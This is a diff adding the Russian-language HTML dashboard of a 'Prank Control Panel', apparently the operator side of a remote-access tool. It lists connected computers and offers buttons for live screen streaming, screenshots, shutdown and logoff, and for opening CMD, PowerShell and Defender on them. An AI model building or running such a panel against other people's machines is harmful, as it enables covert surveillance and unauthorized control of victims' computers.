@@ -1,0 +1,403 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Prank Control Panel</title>
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+</head>
+<body>
+    <div class="container">
+        <header>
+            <h1><i class="fas fa-robot"></i> Prank Control Panel</h1>
+            <div class="status">Сервер: <span id="server-status">Подключение...</span></div>
+        </header>
+        <div class="main-panel">
+            <div class="devices-panel">
+                <h2><i class="fas fa-list"></i> Устройства <span id="device-count">0</span></h2>
+                <ul id="device-list"></ul>
+            </div>
+            <div class="control-panel" id="control-panel" style="display: none;">
+                <div class="device-header">
+                    <h2><span id="selected-device-info"></span></h2>
+                    <span id="device-status" class="status-badge"></span>
+                </div>
+
+                <!-- Категория: Сообщения -->
+                <div class="command-category">
+                    <h3><i class="fas fa-comment"></i> Сообщения</h3>
+                    <div class="command-group">
+                        <input type="text" id="messagebox-title" placeholder="Заголовок" value="Prank">
+                        <input type="text" id="messagebox-text" placeholder="Текст сообщения">
+                        <button id="show-messagebox" class="btn-neon"><i class="fas fa-comment"></i> MessageBox</button>
+                    </div>
+                </div>
+
+                <!-- Категория: Звук -->
+                <div class="command-category">
+                    <h3><i class="fas fa-volume-up"></i> Звук</h3>
+                    <div class="command-group">
+                        <button id="beep" class="btn-neon"><i class="fas fa-bell"></i> Сигнал</button>
+                        <button id="setVolume50" class="btn-neon"><i class="fas fa-volume-down"></i> Громкость 50%</button>
+                        <button id="setVolume0" class="btn-neon"><i class="fas fa-volume-mute"></i> Без звука</button>
+                        <button id="setVolume100" class="btn-neon"><i class="fas fa-volume-up"></i> Громкость 100%</button>
+                    </div>
+                    <div class="command-group">
+                        <input type="text" id="tts-text" placeholder="Текст для озвучки">
+                        <button id="speak-tts" class="btn-neon"><i class="fas fa-microphone-alt"></i> Озвучить</button>
+                    </div>
+                </div>
+
+                <!-- Категория: Экран -->
+                <div class="command-category">
+                    <h3><i class="fas fa-desktop"></i> Экран</h3>
+                    <div class="command-group">
+                        <button id="takeScreenshot" class="btn-neon"><i class="fas fa-camera"></i> Скриншот</button>
+                        <button id="rotateScreen" class="btn-neon"><i class="fas fa-undo-alt"></i> Повернуть</button>
+                        <button id="blankScreen" class="btn-neon"><i class="fas fa-eye-slash"></i> Погасить</button>
+                        <button id="invertColors" class="btn-neon"><i class="fas fa-adjust"></i> Инверсия</button>
+                    </div>
+                    <div class="command-group">
+                        <input type="text" id="wallpaper-url" placeholder="URL картинки">
+                        <button id="setWallpaper" class="btn-neon"><i class="fas fa-image"></i> Сменить обои</button>
+                        <button id="setRandomWallpaper" class="btn-neon"><i class="fas fa-random"></i> Случайные</button>
+                    </div>
+                </div>
+
+                <!-- Категория: Управление ПК -->
+                <div class="command-category">
+                    <h3><i class="fas fa-power-off"></i> Управление</h3>
+                    <div class="command-group">
+                        <button id="lockPc" class="btn-neon"><i class="fas fa-lock"></i> Блокировка</button>
+                        <button id="shutdownPc" class="btn-neon"><i class="fas fa-power-off"></i> Выключение</button>
+                        <button id="restartPc" class="btn-neon"><i class="fas fa-sync-alt"></i> Перезагрузка</button>
+                        <button id="sleepPc" class="btn-neon"><i class="fas fa-bed"></i> Сон</button>
+                        <button id="hibernatePc" class="btn-neon"><i class="fas fa-battery-quarter"></i> Гибернация</button>
+                        <button id="logoffPc" class="btn-neon"><i class="fas fa-sign-out-alt"></i> Выход</button>
+                    </div>
+                    <div class="command-group">
+                        <button id="openCdDrive" class="btn-neon"><i class="fas fa-compact-disc"></i> Открыть CD</button>
+                        <button id="closeCdDrive" class="btn-neon"><i class="fas fa-compact-disc"></i> Закрыть CD</button>
+                        <button id="killTask" class="btn-neon"><i class="fas fa-skull-crossbones"></i> Alt+F4</button>
+                        <button id="minimizeAll" class="btn-neon"><i class="fas fa-window-minimize"></i> Свернуть всё</button>
+                        <button id="maximizeAll" class="btn-neon"><i class="fas fa-window-maximize"></i> Развернуть всё</button>
+                    </div>
+                </div>
+
+                <!-- Категория: Системные утилиты -->
+                <div class="command-category">
+                    <h3><i class="fas fa-tools"></i> Системные</h3>
+                    <div class="command-group">
+                        <button id="openTaskManager" class="btn-neon"><i class="fas fa-tasks"></i> Диспетчер</button>
+                        <button id="openRegedit" class="btn-neon"><i class="fas fa-registered"></i> Реестр</button>
+                        <button id="openCmd" class="btn-neon"><i class="fas fa-terminal"></i> CMD</button>
+                        <button id="openPowershell" class="btn-neon"><i class="fas fa-terminal"></i> PowerShell</button>
+                        <button id="openNotepad" class="btn-neon"><i class="fas fa-file-alt"></i> Блокнот</button>
+                        <button id="openCalc" class="btn-neon"><i class="fas fa-calculator"></i> Калькулятор</button>
+                        <button id="openExplorer" class="btn-neon"><i class="fas fa-folder-open"></i> Проводник</button>
+                    </div>
+                    <div class="command-group">
+                        <button id="openControlPanel" class="btn-neon"><i class="fas fa-cogs"></i> Панель управления</button>
+                        <button id="openSettings" class="btn-neon"><i class="fas fa-sliders-h"></i> Параметры</button>
+                        <button id="openDeviceManager" class="btn-neon"><i class="fas fa-device"></i> Диспетчер устройств</button>
+                        <button id="openDiskManagement" class="btn-neon"><i class="fas fa-hdd"></i> Управление дисками</button>
+                        <button id="openSystemInfo" class="btn-neon"><i class="fas fa-info-circle"></i> Сведения о системе</button>
+                        <button id="openTaskScheduler" class="btn-neon"><i class="fas fa-clock"></i> Планировщик</button>
+                        <button id="openServices" class="btn-neon"><i class="fas fa-cogs"></i> Службы</button>
+                    </div>
+                    <div class="command-group">
+                        <button id="openEventViewer" class="btn-neon"><i class="fas fa-list-alt"></i> Журнал событий</button>
+                        <button id="openResourceMonitor" class="btn-neon"><i class="fas fa-chart-line"></i> Монитор ресурсов</button>
+                        <button id="openPerformanceMonitor" class="btn-neon"><i class="fas fa-chart-bar"></i> Производительность</button>
+                        <button id="openFirewall" class="btn-neon"><i class="fas fa-shield-alt"></i> Брандмауэр</button>
+                        <button id="openDefender" class="btn-neon"><i class="fas fa-shield-virus"></i> Защитник</button>
+                        <button id="openBluetooth" class="btn-neon"><i class="fab fa-bluetooth"></i> Bluetooth</button>
+                    </div>
+                    <div class="command-group">
+                        <button id="openNetworkConnections" class="btn-neon"><i class="fas fa-network-wired"></i> Сетевые подключения</button>
+                        <button id="openSoundSettings" class="btn-neon"><i class="fas fa-volume-up"></i> Звук</button>
+                        <button id="openPowerOptions" class="btn-neon"><i class="fas fa-plug"></i> Электропитание</button>
+                        <button id="openDateTime" class="btn-neon"><i class="fas fa-calendar-alt"></i> Дата и время</button>
+                        <button id="openMouseSettings" class="btn-neon"><i class="fas fa-mouse"></i> Мышь</button>
+                        <button id="openKeyboardSettings" class="btn-neon"><i class="fas fa-keyboard"></i> Клавиатура</button>
+                        <button id="openProgramsAndFeatures" class="btn-neon"><i class="fas fa-box"></i> Программы и компоненты</button>
+                        <button id="openDefaultPrograms" class="btn-neon"><i class="fas fa-file"></i> Программы по умолчанию</button>
+                    </div>
+                </div>
+
+                <!-- Категория: Интернет и сайты -->
+                <div class="command-category">
+                    <h3><i class="fas fa-globe"></i> Интернет</h3>
+                    <div class="command-group">
+                        <input type="url" id="url-input" placeholder="URL">
+                        <button id="openUrl" class="btn-neon"><i class="fas fa-external-link-alt"></i> Открыть</button>
+                        <button id="openUrlFullscreen" class="btn-neon"><i class="fas fa-window-maximize"></i> Полный экран</button>
+                    </div>
+                    <div class="command-group">
+                        <input type="text" id="search-query" placeholder="Поисковый запрос">
+                        <button id="googleSearch" class="btn-neon"><i class="fab fa-google"></i> Google</button>
+                        <button id="youtubeSearch" class="btn-neon"><i class="fab fa-youtube"></i> YouTube</button>
+                    </div>
+                    <div class="command-group">
+                        <button id="openYoutube" class="btn-neon"><i class="fab fa-youtube"></i> YouTube</button>
+                        <button id="openNetflix" class="btn-neon"><i class="fab fa-netflix"></i> Netflix</button>
+                        <button id="openTwitch" class="btn-neon"><i class="fab fa-twitch"></i> Twitch</button>
+                        <button id="openReddit" class="btn-neon"><i class="fab fa-reddit"></i> Reddit</button>
+                        <button id="openGithub" class="btn-neon"><i class="fab fa-github"></i> GitHub</button>
+                        <button id="openStackoverflow" class="btn-neon"><i class="fab fa-stack-overflow"></i> StackOverflow</button>
+                    </div>
+                    <div class="command-group">
+                        <button id="openWikipedia" class="btn-neon"><i class="fab fa-wikipedia-w"></i> Wikipedia</button>
+                        <button id="openRandomArticle" class="btn-neon"><i class="fas fa-random"></i> Случайная статья</button>
+                        <button id="openXkcd" class="btn-neon"><i class="fas fa-comic"></i> XKCD</button>
+                        <button id="openOmfgdogs" class="btn-neon"><i class="fas fa-dog"></i> OMFGDogs</button>
+                        <button id="openPointerpointer" class="btn-neon"><i class="fas fa-mouse-pointer"></i> PointerPointer</button>
+                        <button id="openStaggeringbeauty" class="btn-neon"><i class="fas fa-heart"></i> StaggeringBeauty</button>
+                        <button id="openKoalastothemax" class="btn-neon"><i class="fas fa-koala"></i> KoalasToTheMax</button>
+                        <button id="openTheuselessweb" class="btn-neon"><i class="fas fa-question"></i> UselessWeb</button>
+                        <button id="openBoredbutton" class="btn-neon"><i class="fas fa-smile"></i> BoredButton</button>
+                    </div>
+                </div>
+
+                <!-- Категория: Популярные сервисы -->
+                <div class="command-category">
+                    <h3><i class="fas fa-star"></i> Сервисы</h3>
+                    <div class="command-group">
+                        <button id="openTelegram" class="btn-neon"><i class="fab fa-telegram"></i> Telegram</button>
+                        <button id="openWhatsapp" class="btn-neon"><i class="fab fa-whatsapp"></i> WhatsApp</button>
+                        <button id="openVk" class="btn-neon"><i class="fab fa-vk"></i> VK</button>
+                        <button id="openZoomMeeting" class="btn-neon"><i class="fas fa-video"></i> Zoom</button>
+                        <button id="openTeams" class="btn-neon"><i class="fab fa-microsoft"></i> Teams</button>
+                        <button id="openDiscord" class="btn-neon"><i class="fab fa-discord"></i> Discord</button>
+                        <button id="openSlack" class="btn-neon"><i class="fab fa-slack"></i> Slack</button>
+                    </div>
+                    <div class="command-group">
+                        <button id="openOutlook" class="btn-neon"><i class="fab fa-microsoft"></i> Outlook</button>
+                        <button id="openGmail" class="btn-neon"><i class="fab fa-google"></i> Gmail</button>
+                        <button id="openDrive" class="btn-neon"><i class="fab fa-google-drive"></i> Google Drive</button>
+                        <button id="openDocs" class="btn-neon"><i class="fab fa-google"></i> Google Docs</button>
+                        <button id="openSheets" class="btn-neon"><i class="fab fa-google"></i> Sheets</button>
+                        <button id="openSlides" class="btn-neon"><i class="fab fa-google"></i> Slides</button>
+                        <button id="openForms" class="btn-neon"><i class="fab fa-google"></i> Forms</button>
+                    </div>
+                    <div class="command-group">
+                        <button id="openKeep" class="btn-neon"><i class="fab fa-google"></i> Keep</button>
+                        <button id="openCalendar" class="btn-neon"><i class="fab fa-google"></i> Calendar</button>
+                        <button id="openMaps" class="btn-neon"><i class="fas fa-map-marked-alt"></i> Maps</button>
+                        <button id="openTranslate" class="btn-neon"><i class="fas fa-language"></i> Translate</button>
+                        <button id="openNews" class="btn-neon"><i class="far fa-newspaper"></i> News</button>
+                        <button id="openFlight" class="btn-neon"><i class="fas fa-plane"></i> Flights</button>
+                        <button id="openHotel" class="btn-neon"><i class="fas fa-hotel"></i> Hotels</button>
+                        <button id="openWeather" class="btn-neon"><i class="fas fa-cloud-sun"></i> Weather</button>
+                        <button id="openCurrency" class="btn-neon"><i class="fas fa-dollar-sign"></i> Currency</button>
+                    </div>
+                </div>
+
+                <!-- Категория: Игры -->
+                <div class="command-category">
+                    <h3><i class="fas fa-gamepad"></i> Игры</h3>
+                    <div class="command-group">
+                        <button id="openMinecraft" class="btn-neon"><i class="fas fa-cube"></i> Minecraft</button>
+                        <button id="openRoblox" class="btn-neon"><i class="fas fa-gamepad"></i> Roblox</button>
+                        <button id="openFortnite" class="btn-neon"><i class="fas fa-fort-awesome"></i> Fortnite</button>
+                        <button id="openAmongUs" class="btn-neon"><i class="fas fa-user-astronaut"></i> Among Us</button>
+                        <button id="openValorant" class="btn-neon"><i class="fas fa-crosshairs"></i> Valorant</button>
+                        <button id="openCsgo" class="btn-neon"><i class="fas fa-bomb"></i> CS:GO</button>
+                        <button id="openDota" class="btn-neon"><i class="fas fa-dragon"></i> Dota 2</button>
+                        <button id="openLol" class="btn-neon"><i class="fas fa-hat-wizard"></i> LoL</button>
+                    </div>
+                    <div class="command-group">
+                        <button id="openOverwatch" class="btn-neon"><i class="fas fa-shield-alt"></i> Overwatch</button>
+                        <button id="openApex" class="btn-neon"><i class="fas fa-crown"></i> Apex</button>
+                        <button id="openPubg" class="btn-neon"><i class="fas fa-gun"></i> PUBG</button>
+                        <button id="openCod" class="btn-neon"><i class="fas fa-skull"></i> CoD</button>
+                        <button id="openFifa" class="btn-neon"><i class="fas fa-futbol"></i> FIFA</button>
+                        <button id="openNba" class="btn-neon"><i class="fas fa-basketball-ball"></i> NBA</button>
+                        <button id="openNfl" class="btn-neon"><i class="fas fa-football-ball"></i> NFL</button>
+                        <button id="openNhl" class="btn-neon"><i class="fas fa-hockey-puck"></i> NHL</button>
+                        <button id="openMlb" class="btn-neon"><i class="fas fa-baseball-ball"></i> MLB</button>
+                    </div>
+                    <div class="command-group">
+                        <button id="openUfc" class="btn-neon"><i class="fas fa-fist-raised"></i> UFC</button>
+                        <button id="openWwe" class="btn-neon"><i class="fas fa-wrestling"></i> WWE</button>
+                        <button id="openF1" class="btn-neon"><i class="fas fa-flag-checkered"></i> F1</button>
+                        <button id="openMotogp" class="btn-neon"><i class="fas fa-motorcycle"></i> MotoGP</button>
+                        <button id="openTennis" class="btn-neon"><i class="fas fa-table-tennis"></i> Tennis</button>
+                        <button id="openGolf" class="btn-neon"><i class="fas fa-golf-ball"></i> Golf</button>
+                        <button id="openCycling" class="btn-neon"><i class="fas fa-bicycle"></i> Cycling</button>
+                        <button id="openSki" class="btn-neon"><i class="fas fa-skiing"></i> Ski</button>
+                    </div>
+                </div>
+
+                <!-- Категория: Спорт (олимпийские виды) -->
+                <div class="command-category">
+                    <h3><i class="fas fa-medal"></i> Спорт</h3>
+                    <div class="command-group">
+                        <button id="openOlympics" class="btn-neon"><i class="fas fa-olympic"></i> Olympics</button>
+                        <button id="openParalympics" class="btn-neon"><i class="fas fa-wheelchair"></i> Paralympics</button>
+                        <button id="openCommonwealth" class="btn-neon"><i class="fas fa-flag"></i> Commonwealth</button>
+                        <button id="openUniversiade" class="btn-neon"><i class="fas fa-graduation-cap"></i> Universiade</button>
+                        <button id="openYouthOlympics" class="btn-neon"><i class="fas fa-child"></i> Youth Olympics</button>
+                        <button id="openSpecialOlympics" class="btn-neon"><i class="fas fa-heartbeat"></i> Special Olympics</button>
+                        <button id="openInvictus" class="btn-neon"><i class="fas fa-wheelchair"></i> Invictus</button>
+                        <button id="openWarrior" class="btn-neon"><i class="fas fa-shield-alt"></i> Warrior</button>
+                        <button id="openXgames" class="btn-neon"><i class="fas fa-snowboarding"></i> X Games</button>
+                        <button id="openDewTour" class="btn-neon"><i class="fas fa-skateboarding"></i> Dew Tour</button>
+                        <button id="openStreetLeague" class="btn-neon"><i class="fas fa-skateboarding"></i> Street League</button>
+                        <button id="openWorldSkate" class="btn-neon"><i class="fas fa-skateboarding"></i> World Skate</button>
+                        <button id="openIsa" class="btn-neon"><i class="fas fa-surf"></i> ISA</button>
+                        <button id="openIsl" class="btn-neon"><i class="fas fa-swimmer"></i> ISL</button>
+                        <button id="openWsl" class="btn-neon"><i class="fas fa-surf"></i> WSL</button>
+                        <button id="openWingfoil" class="btn-neon"><i class="fas fa-wind"></i> Wingfoil</button>
+                        <button id="openKite" class="btn-neon"><i class="fas fa-wind"></i> Kite</button>
+                        <button id="openWindsurf" class="btn-neon"><i class="fas fa-sailboat"></i> Windsurf</button>
+                        <button id="openSailing" class="btn-neon"><i class="fas fa-sailboat"></i> Sailing</button>
+                        <button id="openRowing" class="btn-neon"><i class="fas fa-water"></i> Rowing</button>
+                        <button id="openCanoe" class="btn-neon"><i class="fas fa-water"></i> Canoe</button>
+                        <button id="openDragonBoat" class="btn-neon"><i class="fas fa-dragon"></i> Dragon Boat</button>
+                        <button id="openRafting" class="btn-neon"><i class="fas fa-water"></i> Rafting</button>
+                        <button id="openKayak" class="btn-neon"><i class="fas fa-water"></i> Kayak</button>
+                        <button id="openSurfski" class="btn-neon"><i class="fas fa-water"></i> Surfski</button>
+                        <button id="openOutrigger" class="btn-neon"><i class="fas fa-water"></i> Outrigger</button>
+                        <button id="openVaa" class="btn-neon"><i class="fas fa-water"></i> Vaa</button>
+                        <button id="openWakaAma" class="btn-neon"><i class="fas fa-water"></i> Waka Ama</button>
+                        <button id="openPolynesian" class="btn-neon"><i class="fas fa-flag"></i> Polynesian</button>
+                        <button id="openHawaiian" class="btn-neon"><i class="fas fa-flag"></i> Hawaiian</button>
+                        <button id="openMaori" class="btn-neon"><i class="fas fa-flag"></i> Maori</button>
+                        <button id="openPasifika" class="btn-neon"><i class="fas fa-flag"></i> Pasifika</button>
+                        <button id="openAboriginal" class="btn-neon"><i class="fas fa-flag"></i> Aboriginal</button>
+                        <button id="openIndigenous" class="btn-neon"><i class="fas fa-flag"></i> Indigenous</button>
+                        <button id="openFirstNations" class="btn-neon"><i class="fas fa-flag"></i> First Nations</button>
+                        <button id="openInuit" class="btn-neon"><i class="fas fa-flag"></i> Inuit</button>
+                        <button id="openSami" class="btn-neon"><i class="fas fa-flag"></i> Sami</button>
+                        <button id="openSaami" class="btn-neon"><i class="fas fa-flag"></i> Saami</button>
+                        <button id="openFinnish" class="btn-neon"><i class="fas fa-flag"></i> Finnish</button>
+                        <button id="openSwedish" class="btn-neon"><i class="fas fa-flag"></i> Swedish</button>
+                        <button id="openNorwegian" class="btn-neon"><i class="fas fa-flag"></i> Norwegian</button>
+                        <button id="openDanish" class="btn-neon"><i class="fas fa-flag"></i> Danish</button>
+                        <button id="openIcelandic" class="btn-neon"><i class="fas fa-flag"></i> Icelandic</button>
+                        <button id="openFaroese" class="btn-neon"><i class="fas fa-flag"></i> Faroese</button>
+                        <button id="openGreenlandic" class="btn-neon"><i class="fas fa-flag"></i> Greenlandic</button>
+                        <button id="openAlaskan" class="btn-neon"><i class="fas fa-flag"></i> Alaskan</button>
+                        <button id="openCanadian" class="btn-neon"><i class="fas fa-flag"></i> Canadian</button>
+                        <button id="openAmerican" class="btn-neon"><i class="fas fa-flag"></i> American</button>
+                        <button id="openMexican" class="btn-neon"><i class="fas fa-flag"></i> Mexican</button>
+                        <button id="openBrazilian" class="btn-neon"><i class="fas fa-flag"></i> Brazilian</button>
+                        <button id="openArgentinian" class="btn-neon"><i class="fas fa-flag"></i> Argentinian</button>
+                        <button id="openChilean" class="btn-neon"><i class="fas fa-flag"></i> Chilean</button>
+                        <button id="openPeruvian" class="btn-neon"><i class="fas fa-flag"></i> Peruvian</button>
+                        <button id="openColombian" class="btn-neon"><i class="fas fa-flag"></i> Colombian</button>
+                        <button id="openVenezuelan" class="btn-neon"><i class="fas fa-flag"></i> Venezuelan</button>
+                        <button id="openEcuadorian" class="btn-neon"><i class="fas fa-flag"></i> Ecuadorian</button>
+                        <button id="openBolivian" class="btn-neon"><i class="fas fa-flag"></i> Bolivian</button>
+                        <button id="openParaguayan" class="btn-neon"><i class="fas fa-flag"></i> Paraguayan</button>
+                        <button id="openUruguayan" class="btn-neon"><i class="fas fa-flag"></i> Uruguayan</button>
+                        <button id="openDutch" class="btn-neon"><i class="fas fa-flag"></i> Dutch</button>
+                        <button id="openBelgian" class="btn-neon"><i class="fas fa-flag"></i> Belgian</button>
+                        <button id="openFrench" class="btn-neon"><i class="fas fa-flag"></i> French</button>
+                        <button id="openSpanish" class="btn-neon"><i class="fas fa-flag"></i> Spanish</button>
+                        <button id="openPortuguese" class="btn-neon"><i class="fas fa-flag"></i> Portuguese</button>
+                        <button id="openItalian" class="btn-neon"><i class="fas fa-flag"></i> Italian</button>
+                        <button id="openGreek" class="btn-neon"><i class="fas fa-flag"></i> Greek</button>
+                        <button id="openTurkish" class="btn-neon"><i class="fas fa-flag"></i> Turkish</button>
+                        <button id="openRussian" class="btn-neon"><i class="fas fa-flag"></i> Russian</button>
+                        <button id="openUkrainian" class="btn-neon"><i class="fas fa-flag"></i> Ukrainian</button>
+                        <button id="openPolish" class="btn-neon"><i class="fas fa-flag"></i> Polish</button>
+                        <button id="openCzech" class="btn-neon"><i class="fas fa-flag"></i> Czech</button>
+                        <button id="openSlovak" class="btn-neon"><i class="fas fa-flag"></i> Slovak</button>
+                        <button id="openHungarian" class="btn-neon"><i class="fas fa-flag"></i> Hungarian</button>
+                        <button id="openRomanian" class="btn-neon"><i class="fas fa-flag"></i> Romanian</button>
+                        <button id="openBulgarian" class="btn-neon"><i class="fas fa-flag"></i> Bulgarian</button>
+                        <button id="openSerbian" class="btn-neon"><i class="fas fa-flag"></i> Serbian</button>
+                        <button id="openCroatian" class="btn-neon"><i class="fas fa-flag"></i> Croatian</button>
+                        <button id="openSlovenian" class="btn-neon"><i class="fas fa-flag"></i> Slovenian</button>
+                        <button id="openBosnian" class="btn-neon"><i class="fas fa-flag"></i> Bosnian</button>
+                        <button id="openMacedonian" class="btn-neon"><i class="fas fa-flag"></i> Macedonian</button>
+                        <button id="openAlbanian" class="btn-neon"><i class="fas fa-flag"></i> Albanian</button>
+                        <button id="openKosovar" class="btn-neon"><i class="fas fa-flag"></i> Kosovar</button>
+                        <button id="openMontenegrin" class="btn-neon"><i class="fas fa-flag"></i> Montenegrin</button>
+                        <button id="openEstonian" class="btn-neon"><i class="fas fa-flag"></i> Estonian</button>
+                        <button id="openLatvian" class="btn-neon"><i class="fas fa-flag"></i> Latvian</button>
+                        <button id="openLithuanian" class="btn-neon"><i class="fas fa-flag"></i> Lithuanian</button>
+                        <button id="openBelarusian" class="btn-neon"><i class="fas fa-flag"></i> Belarusian</button>
+                        <button id="openMoldovan" class="btn-neon"><i class="fas fa-flag"></i> Moldovan</button>
+                        <button id="openGeorgian" class="btn-neon"><i class="fas fa-flag"></i> Georgian</button>
+                        <button id="openArmenian" class="btn-neon"><i class="fas fa-flag"></i> Armenian</button>
+                        <button id="openAzerbaijani" class="btn-neon"><i class="fas fa-flag"></i> Azerbaijani</button>
+                        <button id="openKazakh" class="btn-neon"><i class="fas fa-flag"></i> Kazakh</button>
+                        <button id="openUzbek" class="btn-neon"><i class="fas fa-flag"></i> Uzbek</button>
+                        <button id="openTurkmen" class="btn-neon"><i class="fas fa-flag"></i> Turkmen</button>
+                        <button id="openKyrgyz" class="btn-neon"><i class="fas fa-flag"></i> Kyrgyz</button>
+                        <button id="openTajik" class="btn-neon"><i class="fas fa-flag"></i> Tajik</button>
+                        <button id="openMongolian" class="btn-neon"><i class="fas fa-flag"></i> Mongolian</button>
+                        <button id="openChinese" class="btn-neon"><i class="fas fa-flag"></i> Chinese</button>
+                        <button id="openJapanese" class="btn-neon"><i class="fas fa-flag"></i> Japanese</button>
+                        <button id="openKorean" class="btn-neon"><i class="fas fa-flag"></i> Korean</button>
+                        <button id="openNorthKorean" class="btn-neon"><i class="fas fa-flag"></i> North Korean</button>
+                        <button id="openTaiwanese" class="btn-neon"><i class="fas fa-flag"></i> Taiwanese</button>
+                        <button id="openHongKong" class="btn-neon"><i class="fas fa-flag"></i> Hong Kong</button>
+                        <button id="openMacanese" class="btn-neon"><i class="fas fa-flag"></i> Macanese</button>
+                        <button id="openVietnamese" class="btn-neon"><i class="fas fa-flag"></i> Vietnamese</button>
+                        <button id="openLao" class="btn-neon"><i class="fas fa-flag"></i> Lao</button>
+                        <button id="openCambodian" class="btn-neon"><i class="fas fa-flag"></i> Cambodian</button>
+                        <button id="openThai" class="btn-neon"><i class="fas fa-flag"></i> Thai</button>
+                        <button id="openMyanmar" class="btn-neon"><i class="fas fa-flag"></i> Myanmar</button>
+                        <button id="openMalaysian" class="btn-neon"><i class="fas fa-flag"></i> Malaysian</button>
+                        <button id="openSingaporean" class="btn-neon"><i class="fas fa-flag"></i> Singaporean</button>
+                        <button id="openIndonesian" class="btn-neon"><i class="fas fa-flag"></i> Indonesian</button>
+                        <button id="openFilipino" class="btn-neon"><i class="fas fa-flag"></i> Filipino</button>
+                        <button id="openBruneian" class="btn-neon"><i class="fas fa-flag"></i> Bruneian</button>
+                        <button id="openTimorese" class="btn-neon"><i class="fas fa-flag"></i> Timorese</button>
+                        <button id="openAustralian" class="btn-neon"><i class="fas fa-flag"></i> Australian</button>
+                        <button id="openNewZealand" class="btn-neon"><i class="fas fa-flag"></i> New Zealand</button>
+                        <button id="openFijian" class="btn-neon"><i class="fas fa-flag"></i> Fijian</button>
+                        <button id="openPapuan" class="btn-neon"><i class="fas fa-flag"></i> Papuan</button>
+                        <button id="openSolomon" class="btn-neon"><i class="fas fa-flag"></i> Solomon</button>
+                        <button id="openVanuatu" class="btn-neon"><i class="fas fa-flag"></i> Vanuatu</button>
+                        <button id="openSamoan" class="btn-neon"><i class="fas fa-flag"></i> Samoan</button>
+                        <button id="openTongan" class="btn-neon"><i class="fas fa-flag"></i> Tongan</button>
+                        <button id="openPalauan" class="btn-neon"><i class="fas fa-flag"></i> Palauan</button>
+                        <button id="openMicronesian" class="btn-neon"><i class="fas fa-flag"></i> Micronesian</button>
+                        <button id="openMarshallese" class="btn-neon"><i class="fas fa-flag"></i> Marshallese</button>
+                        <button id="openNauruan" class="btn-neon"><i class="fas fa-flag"></i> Nauruan</button>
+                        <button id="openKiribati" class="btn-neon"><i class="fas fa-flag"></i> Kiribati</button>
+                        <button id="openTuvaluan" class="btn-neon"><i class="fas fa-flag"></i> Tuvaluan</button>
+                    </div>
+                </div>
+
+                <!-- Категория: Трансляция -->
+                <div class="command-category">
+                    <h3><i class="fas fa-video"></i> Трансляция</h3>
+                    <div class="command-group">
+                        <button id="start-stream" class="btn-neon"><i class="fas fa-play"></i> Старт</button>
+                        <button id="stop-stream" class="btn-neon"><i class="fas fa-stop"></i> Стоп</button>
+                        <select id="stream-quality">
+                            <option value="0.5">0.5 сек</option>
+                            <option value="1" selected>1 сек</option>
+                            <option value="2">2 сек</option>
+                        </select>
+                    </div>
+                </div>
+
+                <!-- Область трансляции -->
+                <div class="stream-area">
+                    <h3><i class="fas fa-video"></i> Трансляция</h3>
+                    <div class="stream-frame">
+                        <img id="stream-image" src="#" alt="Трансляция экрана">
+                        <div id="stream-placeholder">Трансляция не активна</div>
+                    </div>
+                </div>
+
+                <!-- Область скриншота -->
+                <div class="photo-area">
+                    <h3><i class="fas fa-image"></i> Последний скриншот</h3>
+                    <img id="photo-preview" src="#" alt="Скриншот">
+                </div>
+            </div>
+        </div>
+    </div>
+    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
+    <script src="script.js"></script>
+</body>
+</html>
